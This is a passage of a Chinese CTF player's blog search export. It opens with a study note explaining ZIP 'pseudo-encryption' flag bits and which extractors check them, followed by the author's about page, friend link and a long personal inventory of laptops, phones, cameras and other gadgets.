<td>ushort deFlags</td>
</tr>
<tr>
<td>00 00</td>
<td>压缩方式</td>
<td>enum COMPTYPE frCompression</td>
</tr>
<tr>
<td>E8 A6</td>
<td>最后修改文件时间</td>
<td>DOSTIME frFileTime</td>
</tr>
<tr>
<td>32 53</td>
<td>最后修改文件日期</td>
<td>DOSDATE frFileDate</td>
</tr>
<tr>
<td>0C 7E 7F D8</td>
<td>CRC-32 校验</td>
<td>uint frCrc</td>
</tr>
</tbody>
</table>
<p><strong>文件目录结束(endLocator)</strong></p>
<table>
<thead>
<tr>
<th>50 4B 05 06</th>
<th>目录结束标记</th>
<th>char elSignature[4]</th>
</tr>
</thead>
<tbody>
<tr>
<td>00 00</td>
<td>当前磁盘编号</td>
<td>ushort elDiskNumber</td>
</tr>
<tr>
<td>00 00</td>
<td>目录区开始磁盘编号</td>
<td>ushort elStartDiskNumber</td>
</tr>
</tbody>
</table>
<p>record区的<code>frFlags</code>和dirEntry区<code>deFlags</code>两个位置均为8个bit，其中最后一位代表是否加密，只需修改这一位数据即可，如果将该两位改为<code>09</code>的话，就会修改倒数第三位，该位与CRC值相关，修改后会因为压缩软件误认为CRC值未知而无法解密，具体可参看<code>ZIP File Format Specification</code></p>
<h3 id="实现伪加密">实现伪加密</h3>
<p>正常情况下并没有伪加密需求（大概没吧），但在CTF比赛中，出题人可能会人为的将record和dirEntry两个区的加密标志位修改成加密状态，实现伪加密。所以只需要把<code>frFlags</code>和<code>deFlags</code>修改为奇数即可。</p>
<p>那么恢复也只需要修改这两位为偶数即可。</p>
<h3 id="解压软件如何判断是否加密">解压软件如何判断是否加密</h3>
<p>经过实测，7-Zip检测record区的<code>frFlags</code>位，其他解压软件，例如BandZip和WinRAR检测dirEntry区的<code>deFlags</code>位，这三种软件都只检测一位，并不会检测另一个位置，同时也不会进行报错。</p>
<table>
<thead>
<tr>
<th>解压工具</th>
<th>检测位置</th>
</tr>
</thead>
<tbody>
<tr>
<td>BandZip</td>
<td>deFlags</td>
</tr>
<tr>
<td>WinRAR</td>
<td>deFlags</td>
</tr>
<tr>
<td>7-Zip</td>
<td>frFlags</td>
</tr>
</tbody>
</table>
<p>**注意：**据群友所述，2345好压是一个很神奇的软件，它会默认将加密的Zip先按照无加密尝试一次，如果成功解压则直接解压，如果解压失败再输入密码，所以似乎天生对伪加密有抗性？<s>真正的一把梭工具</s>，但是真实性自行验证，我不太想让我的电脑沾上好压。</p>
<h3 id="一把梭工具如何判断是否加密">一把梭工具如何判断是否加密</h3>
<h4 id="随波逐流">随波逐流</h4>
<p>经测试高版本随波逐流（指支持解伪加密的版本）默认检测的是record区的<code>deFlags</code>位。</p>
<h4 id="PuzzleSolver-Pro">PuzzleSolver Pro</h4>
<p>待测试…</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>abouts</title>
    <url>/about/index.html</url>
    <content><![CDATA[<p>一个菜鸡CTFer，以前是学Misc的，现在学烧烤…</p>
]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>友情链接</title>
    <url>/links/index.html</url>
    <content><![CDATA[<h3 id="我的友链信息">我的友链信息</h3>
<p>name: C3ngH</p>
<p>avatar: <a class="link"   href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" >https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg<i class="fas fa-external-link-alt"></i></a></p>
<p>link: <a href="https://c3ngh.top/">https://c3ngh.top/</a></p>
<p>description: 广告位招租</p>
]]></content>
  </entry>
  <entry>
    <title>devices</title>
    <url>/devices/index.html</url>
    <content><![CDATA[<h2 id="正在使用的设备">正在使用的设备</h2>
<p>分享一些好用的数码产品，体验体验科技？</p>
<h3 id="笔记本电脑">笔记本电脑</h3>
<h4 id="Legion-R9000P-2023">Legion R9000P 2023</h4>
<p>是毕业后购买的，拥有R9-7945HX+RTX 4060，自己更换了32G RAM和1T+2T后约等于什么都能干（你怎么知道我23年暑假485买的金百达KP260 PLUS 2T），要我说16大核真是天才想出来的，但是无论怎么折腾续航都无法超过3.5小时，属于是离电就废…？还有惊人的2.55kg重量，但它见证了我CTF从0到1的生涯，也经历了无数次重装系统。<s>（最爱的一集）</s></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/r9000p.jpg"
                        alt="r9000p"
                 ></p>
<h4 id="MacBook-Pro-M4-14英寸-24-1T">MacBook Pro M4 14英寸 24+1T</h4>
<p>25年加入的新成员，补足了R9000P在续航和重量方面的不足（但好像它也没多轻薄），好厉害的离电续航！我夸我夸我夸，但是macOS和Misc好像不是很搭，<s>需要我自适应一下</s>，还有它的音质也好好。但默认情况下<code>/usr</code>目录不可写，<code>sudo</code>也不可写真的会让我破防，还要去恢复模式关掉一个什么设置才行。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/macbook_pro.jpg"
                        alt="macbook_pro"
                 ></p>
<p>然后Windows和Mac混用…就不知道该在那边关掉窗口了，也逐渐分不清<code>alt</code>和<code>command</code>了。</p>
<h3 id="台式电脑">台式电脑</h3>
<h4 id="校用">校用</h4>
<p>感觉是25年上半年最优解啊，爽打游戏</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/d9caa1d60b20077cc734e8f6416ec21.jpg"
                        alt="d9caa1d60b20077cc734e8f6416ec21"
                 ></p>
<h4 id="家用">家用</h4>
<p>经典组合，基本1080P畅玩？但后来不怎么玩游戏了，所以一直吃灰也不想更新设备了，是高中时候自己配的。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/computer1.jpg"
                        alt="computer1"
                 ></p>
<h4 id="电视">电视</h4>
<p>搞了一台小主机放在家里的电视机边上给我爸看电视，之前也会偶尔串流玩一会游戏，插个移动硬盘看点电影什么的，甚至搞了个家庭网盘但没有公网IP遂止。提一句：588真的可以带动4K电视（确信）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/computer2.jpg"
                        alt="computer2"
                 ></p>
<h4 id="散落零部件">散落零部件</h4>
<p>目测家里还有一张矿场下来的3070Ti，RX5700XT，一张GT730，一个650w杂牌电源，六七个至强e5什么什么的，一大堆内存条，比较值钱的可能是ADATA的万紫千红，还有几个240G的SATA固态和两个1T的西数机械硬盘。直接上演《论垃圾佬的一辈子都会在家里留下什么》</p>
<h3 id="显示器">显示器</h3>
<h4 id="小米-Redmi-G24-1080P-165Hz">小米 Redmi G24 1080P 165Hz</h4>
<p>VA面板的，现在看来显示效果已经很差了，但对当时那个中学生来说，这就是顶配。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/xiaomixianshiqi.jpg"
                        alt="xiaomixianshiqi"
                 ></p>
<h4 id="AOC-Q27G2S-2K-170Hz">AOC Q27G2S 2K 170Hz</h4>
<p>现在放在宿舍里用，奇怪 我的购物记录呢（挠头），当时怎么要1399啊可恶</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/aocq27g2s.jpg"
                        alt="aocq27g2s"
                 ></p>
<h3 id="键盘">键盘</h3>
<h4 id="RK-R65">RK R65</h4>
<p>我超喜欢小的键盘</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/rkr65.jpg"
                        alt="rkr65"
                 ></p>
<h4 id="黑爵-AKP846">黑爵 AKP846</h4>
<p>前女友送的生日礼物？</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/akp846.jpg"
                        alt="akp846"
                 ></p>
<h3 id="鼠标">鼠标</h3>
<h4 id="VGN-蜻蜓F1Pro">VGN 蜻蜓F1Pro</h4>
<p>挺轻的，还行？</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/qingtingf1pro.jpg"
                        alt="qingtingf1pro"
                 ></p>
<h4 id="罗技G102">罗技G102</h4>
<p>62.9，带大鼠标垫，23年618血赚记录</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/luojig102.jpg"
                        alt="luojig102"
                 ></p>
<h3 id="手机">手机</h3>
<p>这可太多了，几乎每个品牌都用过，之前算过应该用过几十台？人生第一台手机是小米1，当时我才小学一年级，2011年买的（对我拿到10周年1999了，但后来小米账号找不到了）</p>
<h4 id="OPPO-Find-X8-白色-16-512">OPPO Find X8 白色 16+512</h4>
<p>换掉了之前笨重又续航差差的X7U，总的来说优点是轻薄+续航，缺点是拍照变差了，短焦指纹和USB 2.0，但是10h续航+轻薄小直屏我也太爱了</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/bbe4aec20f6cf99e8d669624f10fa0f.jpg"
                        alt="bbe4aec20f6cf99e8d669624f10fa0f"
                 ></p>
<h4 id="OPPO-Find-X7-Ultra-松影墨韵-16-512（已退役">OPPO Find X7 Ultra 松影墨韵 16+512（已退役</h4>
<p>老O粉了，OPPO会员已经钻卡5.4w积分了~~（早知道就不花那么多钱了）~~</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/oppofindx7ultra.jpg"
                        alt="oppofindx7ultra"
                 ></p>
<h3 id="平板">平板</h3>
<h4 id="iPad-Pro-第三代-11英寸-蜂窝版">iPad Pro 第三代 11英寸 蜂窝版</h4>
<p>21款解决了第二代Type-C接口的问题，也上了M1芯片，在安卓板和iPad之间反复横跳了几次后最终选择了这块板养老，除了续航没那么好好像真没什么问题，苹果换电池好贵啊，不如自己动手吧，反正也过保了（doge</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ipad-pro-11.png"
                        alt="ipad-pro-11"
                 ></p>
<h3 id="手表">手表</h3>
<h4 id="OPPO-Watch2-46mm-eSIM版">OPPO Watch2 46mm eSIM版</h4>
<p>当年安卓表皇…高中梦寐以求的东西（幸好没上大专）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250206235520882.png"
                        alt="image-20250206235520882"
                 ></p>
<h3 id="耳机">耳机</h3>
<h4 id="OPPO-Enco-X3-有线充版">OPPO Enco X3 有线充版</h4>
<p>国补720，对比X2佩戴起来舒适太多了，素皮也很高级，不像X2一样容易划的全是划痕，降噪更自然，耳压很低，总的来说变舒服了，但是降噪好像没X2那么强，我觉得值得</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/7f16e5923bbfdf132b5b7ddd0e6758d.jpg"
                        alt="7f16e5923bbfdf132b5b7ddd0e6758d"
                 ></p>
<h4 id="OPPO-Enco-X2-有线充版（已退役">OPPO Enco X2 有线充版（已退役</h4>
<p>549官网入的，廉颇老矣，尚能饭否？好像还真能</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/oppoencox2.jpg"
                        alt="oppoencox2"
                 ></p>
<h4 id="Beats-Solo3-Wireless-十周年纪念版">Beats Solo3 Wireless 十周年纪念版</h4>
<p>16岁爸妈送给我的生日礼物，让我正式来到了耳机鄙视链低端，但我依然喜欢它一辈子。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/beatssolo3.jpg"
                        alt="beatssolo3"
                 ></p>
<h3 id="相机">相机</h3>
<h4 id="佳能EOS-850D（已退役">佳能EOS 850D（已退役</h4>
<p>跟我最久的一台相机，还用过很多佳能的相机但最喜欢的依然是这台！</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/eos850d.png"
                        alt="eos850d"
                 ></p>
<h4 id="佳能EOS-RP">佳能EOS RP</h4>
<p>如果你说七千块的RP是一坨狗屎那我赞成，但如果它只需要三千多即可入手，那我会称之为最便宜最有性价比的全画幅！配上了原厂转接环继续用原来的EF头</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/RP.jpg"
                        alt="RP"
                 ></p>
<h3 id="镜头">镜头</h3>
<h4 id="佳能EF-S-18-135mm-F3-5-5-6-IS-USM（已退役">佳能EF-S 18-135mm F3.5-5.6 IS USM（已退役</h4>
<p>入门最爱的一集，一镜走天下</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250207001423522.png"
                        alt="image-20250207001423522"
                 ></p>
<h4 id="佳能EF-50mm-F1-8-STM">佳能EF 50mm F1.8 STM</h4>
<p>小痰盂！大光定的感觉真好吧（你没有模特吗）</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250207001354371.png"
                        alt="image-20250207001354371"
                 ></p>
<h4 id="佳能EF-70-200mm-L-F4-USM">佳能EF 70-200mm L F4 USM</h4>
<p>小小白一代，很贫民但是很好用的一颗红圈</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250207001516621.png"
                        alt="image-20250207001516621"
                 ></p>
<h3 id="路由器">路由器</h3>
<h4 id="小米AX3000">小米AX3000</h4>
<p>长得真帅吧，两个路由器Mesh组网一下稳稳跑满千兆。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/xiaomiax3000.jpg"
                        alt="xiaomiax3000"
                 ></p>
<h4 id="小米WR30U">小米WR30U</h4>
<p>性价比最高的OpenWRT机，是联通定制版，网上固件一大堆随便刷，宿舍单人爽用千兆</p>
<h3 id="其余配件">其余配件</h3>
<h4 id="小米移动电源3-20000mAh">小米移动电源3 20000mAh</h4>
<p>好大，用不完根本用不完；好重，拿不动根本拿不动。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/xiaomiyidongdianyuan.jpg"
                        alt="xiaomiyidongdianyuan"
                 ></p>
<h4 id="罗技-iPad键盘">罗技 iPad键盘</h4>
<p>触控板+键盘+保护壳一体了，虽然但是你怎么可以卖这么贵？</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ipad-keyboard.jpg"
                        alt="ipad-keyboard"
                 ></p>
<h4 id="Apple-Pencil-2">Apple Pencil 2</h4>
<p>你也有教育优惠吗？</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/applepencil2.jpg"
                        alt="applepencil2"
                 ></p>
<h4 id="OPPO-100W小方瓶充电器">OPPO 100W小方瓶充电器</h4>
<p>目前在用的真正意义上的万能充，100W SuperVOOC协议，支持65W PD，UFCS，PPS，实测可以给MacBook Pro，iPad Pro，手机，耳机，充电宝等几乎所有设备充电。而且还是磁吸线，强迫症福音。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/080920812829a846d6ee786dfc79605.jpg"
                        alt="080920812829a846d6ee786dfc79605"
                 ></p>
<h4 id="OPPO-50W饼干充电器">OPPO 50W饼干充电器</h4>
<p>居家旅行必备良品，我超爱！口袋一装就能出门。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/supervooc-binggan.jpg"
                        alt="supervooc-binggan"
                 ></p>
<h4 id="联想PD140W充电器">联想PD140W充电器</h4>
<p>显著提高游戏本出门幸福感，私有140W，PD100W也可以给MacBook充电</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/legion140w.jpg"
                        alt="legion140w"
                 ></p>
<h4 id="其余PD充电器">其余PD充电器</h4>
<p>小而美，简直是为我的iPad Pro量身定制。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/chargerforipad.jpg"
                        alt="chargerforipad"
                 ></p>
<h4 id="扩展坞-硬盘盒-线材-支架-绿联-all-in-one">扩展坞&amp;硬盘盒&amp;线材&amp;支架 - 绿联 all in one</h4>
<p>没有人知道我买了多少绿联的配件。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ugreenallinone.jpg"
                        alt="ugreenallinone"
                 ></p>
<h4 id="智能家居-其余数码产品-小米-all-in-one">智能家居&amp;其余数码产品 - 小米 all in one</h4>
<p>小米全家桶？反正包括但不仅限于智能门锁、小爱同学、显示器、台灯、挂灯、电动牙刷、充电宝、充电器、路由器、电视、智能猫眼等等等。</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/xiaomiallinone.jpg"
                        alt="xiaomiallinone"
                 ></p>
<h4 id="榨汁杯">榨汁杯</h4>
<p>指标单列，显著提升生活幸福感</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/fcd23f12b72335b9ea42d2f29b662c9.jpg"
                        alt="fcd23f12b72335b9ea42d2f29b662c9"
                 ></p>
<h3 id="一些残骸">一些残骸</h3>
<p>这一面墙都是比较有意义的电子产品的盒子，还有一些因为太大了就扔了或者移动到别的地方了，还有一些二手卖掉了就把盒子也给了所以这只是很小一部分…有机会的话我一定会整理一个我用过的所有电子产品的清单，唉当时我要是没买这些的话，那我高低也是一个富裕的人吧</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/somebox.jpg"
                        alt="somebox"
                 ></p>
<h3 id="写在最后">写在最后</h3>
<p>欲买桂花同载酒，终不似，少年游。如果有什么喜欢的东西，在能力范围内的一定要买给自己！就算是很久很久以后在二手市场看到自己曾经喜欢过的物品也值得购买，因为那些也是曾经一个少年的梦想。对自己好点。</p>
]]></content>
  </entry>
</search>
